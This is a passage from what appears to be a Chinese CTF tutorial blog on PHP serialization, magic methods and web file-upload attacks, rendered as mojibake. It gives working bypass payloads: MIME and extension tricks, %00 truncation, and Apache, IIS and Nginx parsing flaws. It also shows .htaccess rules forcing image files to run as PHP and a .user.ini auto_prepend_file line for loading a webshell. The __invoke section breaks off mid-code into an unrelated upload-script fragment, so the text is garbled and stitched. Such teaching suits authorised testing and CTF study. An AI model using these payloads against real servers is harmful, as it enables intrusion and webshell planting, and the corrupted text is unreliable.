ä¹Ÿåªèƒ½è¯»åˆ°ä¸€ä¸²æ™®é€šçš„å­—ç¬¦ä¸²ï¼Œä¹Ÿä¸æ˜¯ä¸€ä¸ªè¢«èµ‹å€¼äº†çš„å˜é‡ã€‚</p><p>åºåˆ—åŒ–ã€ååºåˆ—åŒ–ç”¨åˆ°çš„å‡½æ•°å°±æ˜¯serializeå’Œunserialize</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">array</span>(<span class="string">'a'</span> =&gt; <span class="string">'Apple'</span> ,<span class="string">'b'</span> =&gt; <span class="string">'banana'</span> , <span class="string">'c'</span> =&gt; <span class="string">'Coconut'</span>);</span><br><span class="line">  </span><br><span class="line"><span class="comment">//åºåˆ—åŒ–æ•°ç»„</span></span><br><span class="line">$s = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $s;</span><br><span class="line"><span class="comment">//è¾“å‡ºç»“æœï¼ša:3:&#123;s:1:"a";s:5:"Apple";s:1:"b";s:6:"banana";s:1:"c";s:7:"Coconut";&#125;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br /&gt;&lt;br /&gt;'</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//ååºåˆ—åŒ–</span></span><br><span class="line">$o = unserialize($s);</span><br><span class="line">print_r($o);</span><br><span class="line"><span class="comment">//è¾“å‡ºç»“æœ Array ( [a] =&gt; Apple [b] =&gt; banana [c] =&gt; Coconut )</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;å¯¹äºåºåˆ—åŒ–çš„è§„åˆ™ï¼Œæ¯”å¦‚<code>a:3:{s:1:&quot;a&quot;;s:5:&quot;Apple&quot;;s:1:&quot;b&quot;;s:6:&quot;banana&quot;;s:1:&quot;c&quot;;s:7:&quot;Coconut&quot;;}</code>è¿™æ¡åºåˆ—åŒ–ä¸­å­—ç¬¦çš„å…·ä½“å«ä¹‰ï¼šaå°±ä»£è¡¨è¿™æ˜¯ä¸€ä¸ªæ•°ç»„ï¼ˆarrayï¼‰ï¼Œ3ä»£è¡¨è¿™ä¸ªæ•°ç»„é‡Œæœ‰ä¸‰ä¸ªå…ƒç´ ï¼Œç”¨åˆ†å·éš”å¼€ï¼›æ¯ä¸ªå…ƒç´ åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ï¼škeyã€valueã€‚è¿™é‡Œçš„sä»£è¡¨è¿™é‡Œçš„keyä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œ1ä»£è¡¨è¿™ä¸ªkeyçš„é•¿åº¦ï¼Œâ€œaâ€å°±æ˜¯keyçš„å€¼ã€‚ç´§æ¥ç€çš„sä»£è¡¨è¿™é‡Œçš„valueæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œ5ä»£è¡¨è¿™ä¸ªvalueçš„é•¿åº¦ï¼Œâ€œAppleâ€å°±æ˜¯valueçš„å€¼ã€‚å¦‚æœè¿™ä¸ªæ•°ç»„ä¸æ˜¯é”®å€¼å¯¹çš„å½¢å¼è¯ï¼Œé‚£ä¹ˆåºåˆ—åŒ–ä¸²åˆ™ä¼šå°†å…ƒç´ çš„ä¸‹æ ‡ä½œä¸ºkeyï¼Œintç±»å‹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">array</span>(<span class="string">'a'</span> , <span class="string">'Apple'</span>, <span class="string">'b'</span> , <span class="string">'banana'</span>, <span class="string">'c'</span> , <span class="string">'Coconut'</span>);</span><br><span class="line"><span class="comment">//åºåˆ—åŒ–æ•°ç»„</span></span><br><span class="line">$s = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $s;</span><br><span class="line"><span class="comment">//è¾“å‡ºç»“æœï¼ša:6:&#123;i:0;s:1:"a";i:1;s:5:"Apple";i:2;s:1:"b";i:3;s:6:"banana";i:4;s:1:"c";i:5;s:7:"Coconut";&#125;</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;é™¤äº†æ•°ç»„å¯ä»¥åºåˆ—åŒ–ï¼Œå¯¹è±¡å•¥çš„ä¹Ÿå¯ä»¥ï¼ŒOä»£è¡¨çš„æ˜¯å¯¹è±¡ï¼Œå¯¹è±¡ä¸­çš„å±æ€§çš„ç±»å‹åœ¨åºåˆ—åŒ–ä¸­ä¹Ÿæœ‰ä¼šç‰¹æ®Šçš„æ ‡è¯†ï¼Œä½†æœ‰äº›æ˜¯ä¸å¯æ‰“å°å­—ç¬¦ï¼Œå¯ä»¥ç”¨base64ç¼–ç æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</p><p>&emsp;&emsp;åœ¨CTFè§£é¢˜è¿‡ç¨‹ä¸­ï¼Œåˆ©ç”¨ç‚¹ä¸€èˆ¬æ˜¯å‡ºç°åœ¨ååºåˆ—åŒ–ä¸Šã€‚æ¯”å¦‚ï¼Œæˆ‘ä»¬ä¹‹å‰æåˆ°å­—ç¬¦ä¸²çš„åºåˆ—åŒ–ä¸²ä¼šæœ‰ä¸“é—¨ä¸€ä¸ªè¡¨ç¤ºå­—ç¬¦ä¸²é•¿åº¦çš„å€¼ï¼Œè¿™ä¸ªå€¼å†³å®šç€ååºåˆ—åŒ–æ—¶è¯»å–çš„å­—ç¬¦ä¸²çš„é•¿åº¦ã€è¯•æƒ³å¦‚æœè¿™ä¸ªå€¼æ¯”å®é™…çš„å€¼å¤§äº†ï¼Œæˆ–è€…å°äº†ï¼Œä¼šäº§ç”Ÿå•¥é—®é¢˜å‘¢ï¼Ÿã€‘ã€‚ç„¶åå°±æ˜¯åœ¨å¯¹è±¡çš„åºåˆ—åŒ–æ—¶ï¼Œphpä¸­é­”æœ¯æ–¹æ³•çš„å­˜åœ¨äº†ã€‚</p><p>æ¨èä¸€ä¸‹å…ˆçŸ¥è¿™ç¯‡æ–‡ç« ï¼š<a href="https://xz.aliyun.com/t/8082#toc-2" target="_blank" rel="noopener">æ€æ ·æŒ–æ˜å‡ºå±äºè‡ªå·±çš„phpååºåˆ—åŒ–é“¾</a></p><h2 id="é­”æœ¯æ–¹æ³•"><a href="#é­”æœ¯æ–¹æ³•" class="headerlink" title="é­”æœ¯æ–¹æ³•"></a>é­”æœ¯æ–¹æ³•</h2><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">__wakeup</span>() <span class="comment">//ä½¿ç”¨unserializeæ—¶è§¦å‘</span></span><br><span class="line"><span class="selector-tag">__sleep</span>() <span class="comment">//ä½¿ç”¨serializeæ—¶è§¦å‘</span></span><br><span class="line"><span class="selector-tag">__destruct</span>() <span class="comment">//å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘</span></span><br><span class="line"><span class="selector-tag">__call</span>() <span class="comment">//åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span></span><br><span class="line"><span class="selector-tag">__callStatic</span>() <span class="comment">//åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span></span><br><span class="line"><span class="selector-tag">__get</span>() <span class="comment">//ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®</span></span><br><span class="line"><span class="selector-tag">__set</span>() <span class="comment">//ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§</span></span><br><span class="line"><span class="selector-tag">__isset</span>() <span class="comment">//åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘</span></span><br><span class="line"><span class="selector-tag">__unset</span>() <span class="comment">//åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘</span></span><br><span class="line"><span class="selector-tag">__toString</span>() <span class="comment">//æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘</span></span><br><span class="line"><span class="selector-tag">__invoke</span>() <span class="comment">//å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</span></span><br></pre></td></tr></table></figure><h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestClass</span>   </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>   </span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="keyword">return</span> <span class="string">'__toString&lt;br /&gt;'</span>;   </span><br><span class="line">    &#125;   </span><br><span class="line">&#125;   </span><br><span class="line"><span class="comment">// åˆ›å»ºä¸€ä¸ªå¯¹è±¡   </span></span><br><span class="line">$object = <span class="keyword">new</span> TestClass(); </span><br><span class="line"></span><br><span class="line"><span class="comment">// å¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²   </span></span><br><span class="line"><span class="comment">//  __toStringä¼šè¢«è°ƒç”¨  </span></span><br><span class="line"><span class="keyword">echo</span> $object;   </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">è¾“å‡ºæ•ˆæœå¦‚ä¸‹ï¼š</span><br><span class="line">__toString</span><br></pre></td></tr></table></figure><h3 id="invoke"><a href="#invoke" class="headerlink" title="__invoke()"></a>__invoke()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       <span class="meta">?&gt;</span><span class="string">")&#125;</span></span><br><span class="line"><span class="string">r1 = r.post(url, files=file1)</span></span><br><span class="line"><span class="string">print(r1.text)</span></span><br></pre></td></tr></table></figure><p>ä½†å¦‚æœæœåŠ¡ç«¯æ²¡æœ‰å¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œè¿‡æ»¤çš„è¯ï¼Œæˆ–è€…è¿‡æ»¤çš„ä¸å¤Ÿå®Œå–„ï¼Œåˆ™å®¹æ˜“è¢«æ”»å‡»è€…è¶è™šè€Œå…¥ã€‚ä¸‹é¢å°±è®²ä¸€ä¸‹æ–‡ä»¶åç¼€çš„ç»•è¿‡</p><h3 id="å®¢æˆ·ç«¯ç»•è¿‡"><a href="#å®¢æˆ·ç«¯ç»•è¿‡" class="headerlink" title="å®¢æˆ·ç«¯ç»•è¿‡"></a>å®¢æˆ·ç«¯ç»•è¿‡</h3><p>&emsp;&emsp;æµè§ˆå™¨ç¦ç”¨JavaScriptï¼›æˆ–è€…æŠ“åŒ…ä¿®æ”¹åç¼€å°±å¯ä»¥äº†ã€‚</p><h3 id="æœåŠ¡å™¨ç«¯MIMEç»•è¿‡"><a href="#æœåŠ¡å™¨ç«¯MIMEç»•è¿‡" class="headerlink" title="æœåŠ¡å™¨ç«¯MIMEç»•è¿‡"></a>æœåŠ¡å™¨ç«¯MIMEç»•è¿‡</h3><p>åŒæ ·æŠ“åŒ…ä¿®æ”¹æ•°æ®åŒ…çš„content-typeå­—æ®µå°±å¯ã€‚</p><p>å¸¸è§çš„å›¾ç‰‡æ ¼å¼çš„MIMEç±»å‹æœ‰ä»¥ä¸‹ å‡ ç§ç±»å‹ï¼š</p><p>PNGå›¾åƒï¼šimage/png </p><p>GIFå›¾å½¢ï¼š image/gif </p><p>JPGå›¾å½¢ï¼šimage/jpeg</p><h3 id="æœåŠ¡å™¨ç«¯æ‰©å±•åæ£€æµ‹ç»•è¿‡"><a href="#æœåŠ¡å™¨ç«¯æ‰©å±•åæ£€æµ‹ç»•è¿‡" class="headerlink" title="æœåŠ¡å™¨ç«¯æ‰©å±•åæ£€æµ‹ç»•è¿‡"></a>æœåŠ¡å™¨ç«¯æ‰©å±•åæ£€æµ‹ç»•è¿‡</h3><h4 id="é»‘åå•"><a href="#é»‘åå•" class="headerlink" title="é»‘åå•"></a>é»‘åå•</h4><ol><li><p>æ–‡ä»¶åå¤§å°å†™ç»•è¿‡ï¼špHpï¼ŒAsP</p></li><li><p>ç‰¹æ®Šæ–‡ä»¶åç»•è¿‡</p><p>&emsp;&emsp;åœ¨Windowsä¸‹æœ‰ä¸€ä¸ªç‰¹æ€§å°±æ˜¯å¦‚æœæ–‡ä»¶åç¼€ä»¥ç‚¹â€˜.â€™æˆ–è€…ç©ºæ ¼â€˜ â€™ç»“å°¾çš„åç¼€ åæ—¶ï¼Œç³»ç»Ÿåœ¨ä¿å­˜æ–‡ä»¶æ—¶ä¼šè‡ªåŠ¨å»é™¤ç‚¹å’Œç©ºæ ¼ã€‚ä½†è¦æ³¨æ„ Unix/Linux ç³»ç»Ÿæ²¡æœ‰ è¿™ä¸ªç‰¹æ€§ã€‚å› ä¸ºæœ‰äº›æœåŠ¡å™¨ç«¯çš„åç¼€åæ£€æµ‹æ˜¯å–æ–‡ä»¶åæœ€åä¸€ä¸ª.åé¢çš„å­—ç¬¦ä¸²ï¼Œæ‹¿è¿™ä¸ªå­—ç¬¦ä¸²ä¸é»‘åå•åˆ—è¡¨å¯¹æ¯”</p></li><li><p>0x00æˆªæ–­ç»•è¿‡</p><p>&emsp;&emsp;ååç¼€æœ‰ä¸€ä¸ª%00å­—èŠ‚ï¼Œå¯ä»¥æˆªæ–­æŸäº›å‡½æ•°å¯¹æ–‡ä»¶åçš„åˆ¤æ–­ã€‚åœ¨è®¸å¤šè¯­è¨€å‡½ æ•°ä¸­ï¼Œå¤„ç†å­—ç¬¦ä¸²çš„å‡½æ•°ä¸­0x00è¢«è®¤ä¸ºæ˜¯ç»ˆæ­¢ç¬¦ã€‚</p><p>&emsp;&emsp;ä¾‹å¦‚: ç½‘ç«™ä¸Šä¼ å‡½æ•°å¤„ç†xxx.asp%00.jpgæ—¶ï¼Œé¦–å…ˆåç¼€åæ˜¯åˆæ³•çš„jpgæ ¼å¼ï¼Œå¯ä»¥ ä¸Šä¼ ï¼Œåœ¨ä¿å­˜æ–‡ä»¶æ—¶ï¼Œé‡åˆ°%00å­—ç¬¦ä¸¢å¼ƒåé¢çš„ .jpgï¼Œæ–‡ä»¶åç¼€æœ€ç»ˆä¿å­˜çš„åç¼€ åä¸ºxxx.asp</p></li></ol><h4 id="ç™½åå•"><a href="#ç™½åå•" class="headerlink" title="ç™½åå•"></a>ç™½åå•</h4><ol><li><p>æˆªæ–­ç»•è¿‡</p><p>&emsp;&emsp;ç”¨åƒtest.asp%00.jpgçš„æ–¹å¼è¿›è¡Œæˆªæ–­ï¼Œå±äºç™½åå•æ–‡ä»¶</p><p>&emsp;&emsp;ã€ä½†æ˜¯é˜²å¾¡çš„è¯ï¼Œå°±æ˜¯æ£€æµ‹çš„æ˜¯å•¥åç¼€ï¼Œå°±ä»¥å•¥åç¼€æ¥ä¿å­˜ï¼Œæ–‡ä»¶åå†è¿›è¡Œå˜åŒ–ï¼Œæ¯”å¦‚ç”¨æ—¶é—´æˆ³æ¥æ›¿æ¢ï¼Œè€Œéä»¥åŸå§‹æ–‡ä»¶åç›´æ¥ä¿å­˜ã€‚ã€‘</p></li><li><p>æ¥ä¸‹æ¥å°†è¦è®¨è®ºçš„ è§£æ/åŒ…å« æ¼æ´ç»•è¿‡</p></li></ol><h3 id="è§£ææ¼æ´"><a href="#è§£ææ¼æ´" class="headerlink" title="è§£ææ¼æ´"></a>è§£ææ¼æ´</h3><h4 id="Apacheè§£ææ¼æ´"><a href="#Apacheè§£ææ¼æ´" class="headerlink" title="Apacheè§£ææ¼æ´"></a>Apacheè§£ææ¼æ´</h4><p>&emsp;&emsp;CVE-2017-15715ï¼Œä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ååŒ…å«æ¢è¡Œç¬¦çš„æ–‡ä»¶ã€‚æ³¨æ„ï¼Œåªèƒ½æ˜¯<code>\x0A</code>ï¼Œä¸èƒ½æ˜¯<code>\x0D\x0A</code>ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨hexåŠŸèƒ½åœ¨1.phpåé¢æ·»åŠ ä¸€ä¸ª<code>\x0A</code>ã€‚</p><p>&emsp;&emsp;å¦ä¸€ä¸ªæ˜¯ä¸Šä¼ 1.php.xxxï¼Œåé¢xxxéšä¾¿æ¥ä¸ªä¸èƒ½è¢«è§£æçš„ä¸œè¥¿ï¼Œéšåapacheå°±ä¼šå¾€å‰ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªèƒ½è¢«è§£æçš„åç¼€åï¼Œæ¯”å¦‚è¿™é‡Œçš„phpã€‚</p><h4 id="IISè§£ææ¼æ´"><a href="#IISè§£ææ¼æ´" class="headerlink" title="IISè§£ææ¼æ´"></a>IISè§£ææ¼æ´</h4><p>&emsp;&emsp;IIS6.0æœ‰ä¸¤ä¸ªè§£ææ¼æ´ï¼Œä¸€ä¸ªæ˜¯å¦‚æœç›®å½•ååŒ…å«asp ã€asaã€cerå­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆè¿™ä¸ªç›®å½•ä¸‹æ‰€æœ‰çš„æ–‡ ä»¶éƒ½ä¼šæŒ‰ç…§ asp å»è§£æã€‚</p><p>&emsp;&emsp;ä¾‹å¦‚ï¼š chaoasp/1.jpg</p><p>&emsp;&emsp;å› ä¸ºæ–‡ä»¶åä¸­æœ‰aspå­—æ ·ï¼Œæ‰€ä»¥è¯¥æ–‡ä»¶å¤¹ä¸‹çš„1.jpgæ–‡ä»¶æ‰“å¼€æ—¶ï¼Œä¼šæŒ‰ç…§aspæ–‡ä»¶å»è§£ææ‰§è¡Œ</p><p>å¦ä¸€ä¸ªæ˜¯åªè¦æ–‡ä»¶åä¸­å«æœ‰.aspã€.asaã€.cerä¼šä¼˜å…ˆæŒ‰ asp æ¥è§£æ</p><p>&emsp;&emsp;IIS7.0/7.5æ˜¯å¯¹phpè§£ææ—¶æœ‰ä¸€ä¸ªç±»ä¼¼äºNginxçš„è§£ææ¼æ´ï¼Œ å¯¹ä»»æ„æ–‡ä»¶ååªè¦åœ¨URLåé¢è¿½åŠ  ä¸Šå­—ç¬¦ä¸²â€œ/ä»»æ„æ–‡ä»¶å.phpâ€å°±ä¼šæŒ‰ç…§ php çš„æ–¹å¼å»è§£æ ã€‚</p><p>&emsp;&emsp;ä¾‹å­ ï¼š â€<a href="http://www.t/" target="_blank" rel="noopener">http://www.</a>baidu.com/upload/chao/1.jpg/chao.phpâ€</p><p>&emsp;&emsp;è¿™ç§æƒ…å†µä¸‹è®¿é—®1.jpgï¼Œè¯¥æ–‡ä»¶å°±ä¼šæŒ‰ç…§phpæ ¼å¼è¢«è§£ææ‰§è¡Œ</p><h4 id="Nginxè§£ææ¼æ´"><a href="#Nginxè§£ææ¼æ´" class="headerlink" title="Nginxè§£ææ¼æ´"></a>Nginxè§£ææ¼æ´</h4><p>&emsp;&emsp;ä¸€ä¸ªæ˜¯å¯¹ä»»æ„æ–‡ä»¶åï¼Œåœ¨åé¢æ·»åŠ /ä»»æ„æ–‡ä»¶å.phpçš„è§£ææ¼æ´ï¼Œæ¯”å¦‚åŸæœ¬æ–‡ä»¶åæ˜¯ test.jpgï¼Œ å¯ä»¥æ·»åŠ ä¸º test.jpg/x.php è¿›è¡Œè§£ææ”»å‡»ã€‚</p><p>&emsp;&emsp;ä¸€ç§æ˜¯å¯¹ä½ç‰ˆæœ¬çš„ Nginx å¯ä»¥åœ¨ä»»æ„æ–‡ä»¶ååé¢æ·»åŠ %00.php</p><p>&emsp;&emsp;ä¾‹å¦‚ï¼š127.0.0.1/sql-loads/load/chao.jpg%00.php</p><p>&emsp;&emsp;é‚£ä¹ˆchao.jpgä¹Ÿå°±è¢«å½“ä½œphpæ ¼å¼æ–‡ä»¶æ‰§è¡Œ</p><p>&emsp;&emsp;nginx 0.5.* [Success] </p><p>&emsp;&emsp;nginx 0.6.* [Success] </p><p>&emsp;&emsp;nginx 0.7 &lt;= 0.7.65 [Success] </p><p>&emsp;&emsp;nginx 0.8 &lt;= 0.8.37 [Success]</p><h2 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h2><p>æ–‡ä»¶åŒ…å«ä¸€èˆ¬æ¶‰åŠå››ä¸ªå‡½æ•°</p><p>require()</p><p>require_once()</p><p>include()</p><p>include_once()</p><p>&emsp;&emsp;æ— è®ºåŒ…å«çš„æ–‡ä»¶æ˜¯å•¥æ ¼å¼ï¼Œtxtè¿˜æ˜¯jpgï¼Œè¢«<code>&lt;?php ?&gt;</code>æ ‡ç­¾ ã€çŸ­æ ‡ç­¾ä¹Ÿå¯ã€‘åŒ…è£¹çš„å†…å®¹éƒ½ä¼šè¢«å½“æˆphpä»£ç æ‰§è¡Œã€‚å› æ­¤ï¼Œå¦‚æœæ–‡ä»¶ä¸Šä¼ ä¸èƒ½ç»•è¿‡åç¼€çš„è¯ï¼Œèƒ½æ‰¾åˆ°æ–‡ä»¶åŒ…å«æ¼æ´ä¹ŸåŒæ ·å®ç°æ”»å‡»ã€‚è€Œå¦‚æœæƒ³è¯»è¢«åŒ…å«æ–‡ä»¶çš„æºç çš„è¯ï¼Œå°±è¦ç”¨åˆ°phpä¼ªåè®®ï¼Œå› ä¸ºphpä»£ç ã€é™¤éä½  <code>highlight_file(__FILE__);</code>äº†ã€‘æ˜¯ä¸å¯è§çš„ï¼Œéœ€è¦ç”¨phpçš„filterä¼ªåè®®å»base64ç¼–ç ä¸€ä¸‹â€”â€”<code>php://filter/read=convert.base64-encode/resource=$pathâ€</code></p><p>&emsp;&emsp;ä½†æ˜¯å¦‚æœæœ‰ä¸Šä¼ ç‚¹ï¼Œæœ‰è¿‡æ»¤ï¼Œç„¶ååˆæ‰¾ä¸åˆ°æ–‡ä»¶åŒ…å«ï¼Œæ˜¯å¦å°±æ— è·¯äº†ï¼Ÿå€’ä¹Ÿä¸å°½ç„¶ï¼Œé‚£è¦çœ‹è¿™ä¸ªæ–‡ä»¶ä¸Šä¼ çš„ç‚¹çš„è¿‡æ»¤ä¸¥ä¸ä¸¥æ ¼äº†ï¼Œå¦‚æœåªæ˜¯ç®€ç®€å•å•é»‘åå•ï¼Œé‚£å°±ï¼Œå˜¿å˜¿å˜¿~</p><h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h3><p>&emsp;&emsp;.htaccessæ–‡ä»¶(æˆ–è€…â€åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶â€ï¼‰,å…¨ç§°æ˜¯Hypertext Access(è¶…æ–‡æœ¬å…¥å£)ã€‚æä¾›äº†é’ˆå¯¹ç›®å½•æ”¹å˜é…ç½®çš„æ–¹æ³•ï¼Œ å³ï¼Œåœ¨ä¸€ä¸ªç‰¹å®šçš„æ–‡æ¡£ç›®å½•ä¸­æ”¾ç½®ä¸€ä¸ªåŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªæŒ‡ä»¤çš„æ–‡ä»¶ï¼Œ ä»¥ä½œç”¨äºæ­¤ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•ã€‚ä½œä¸ºç”¨æˆ·ï¼Œæ‰€èƒ½ä½¿ç”¨çš„å‘½ä»¤å—åˆ°é™åˆ¶ã€‚ç®¡ç†å‘˜å¯ä»¥é€šè¿‡Apacheçš„AllowOverrideæŒ‡ä»¤æ¥è®¾ç½®ã€‚</p><p>&emsp;&emsp;æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¯¥æ–‡ä»¶æ¥ç»•è¿‡æ–‡ä»¶ä¸Šä¼ æ—¶çš„è¿‡æ»¤ã€‚å‰ææ˜¯æˆ‘ä»¬èƒ½ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶ã€å¦‚æœèƒ½è¯»å†™æœåŠ¡ç«¯çš„è¯¥æ–‡ä»¶ä¹Ÿå¯ã€‘ï¼Œå…·ä½“æ–¹æ³•å°±æ˜¯ä¸Šä¼ åŒ…å«å¦‚ä¸‹å†…å®¹çš„.htaccessæ–‡ä»¶</p><p>æ–¹æ³•1</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å°†æ–‡ä»¶åå«æœ‰"dd"çš„è§£ææˆphpæ–‡ä»¶</span></span><br><span class="line"><span class="section">&lt;FilesMatch "dd"&gt;</span></span><br><span class="line">  <span class="attribute"><span class="nomarkup">SetHandler</span></span> application/x-httpd-php</span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure><p>æ–¹æ³•2</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#å°†æ–‡ä»¶åç¼€ä¸º.pngçš„è§£ææˆphpæ–‡ä»¶</span></span><br><span class="line">AddType  <span class="built_in">application</span>/x-httpd-php    .png</span><br></pre></td></tr></table></figure><h3 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h3><p>&emsp;&emsp;å…·ä½“å¯ä»¥çœ‹çœ‹<a href="https://segmentfault.com/a/1190000011552335?utm_source=tag-newest" target="_blank" rel="noopener">è¿™ç¯‡æ–‡ç« </a>ã€‚<a href="[https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html](https://wooyun.js.org/drops/user.iniæ–‡ä»¶æ„æˆçš„PHPåé—¨.html)">è¿™ç¯‡</a>ä¹Ÿä¸é”™</p><p>&emsp;&emsp;è‡ª PHP 5.3.0 èµ·ï¼ŒPHP æ”¯æŒåŸºäºæ¯ä¸ªç›®å½•çš„ .htaccess é£æ ¼çš„ INI æ–‡ä»¶ã€‚æ­¤ç±»æ–‡ä»¶<strong>ä»…</strong>è¢« CGIï¼FastCGI SAPI å¤„ç†ã€‚æ­¤åŠŸèƒ½ä½¿å¾— PECL çš„ htscanner æ‰©å±•ä½œåºŸã€‚å¦‚æœä½¿ç”¨ Apacheï¼Œåˆ™ç”¨ .htaccess æ–‡ä»¶æœ‰åŒæ ·æ•ˆæœã€‚å³.user.iniå¯ä»¥ä¿®æ”¹é…ç½®ï¼Œä½†æ˜¯åªæœ‰<a href="http://php.net/manual/zh/ini.list.php" target="_blank" rel="noopener">PHP_IN_USERæ¨¡å¼çš„é…ç½®</a>æ‰å¯ä»¥åœ¨.user.iniä¸­è®¾å®šã€‚</p><p>&emsp;&emsp;è€Œå¯ä¿®æ”¹çš„é…ç½®ä¸­æˆ‘ä»¬åˆ©ç”¨çš„æ¯”è¾ƒå¤šçš„å°±æ˜¯<code>auto_prepend_file</code> ï¼Œ</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">auto_prepend_file</span>=<span class="number">01</span>.gif</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;å°±æ˜¯è®©æ‰€æœ‰phpæ–‡ä»¶éƒ½â€œè‡ªåŠ¨â€åŒ…å« <code>01.gif</code> è¿™ä¸ªæ–‡ä»¶ï¼Œè€Œè¿™ä¸ªæ–‡ä»¶å¯ä»¥æ˜¯ä¸€ä¸ªæ­£å¸¸phpæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªåŒ…å«ä¸€å¥è¯çš„webshellã€‚æ‰€ä»¥æœ‰ä¸€ä¸ªè¦æ±‚å°±æ˜¯.user.iniæ‰€åœ¨ç›®å½•è‡³å°‘å¾—æœ‰ä¸€ä¸ªå¯è®¿é—®çš„phpæ–‡ä»¶ã€‚</p><p>&emsp;&emsp;é™¤äº†ä¸Šä¼ 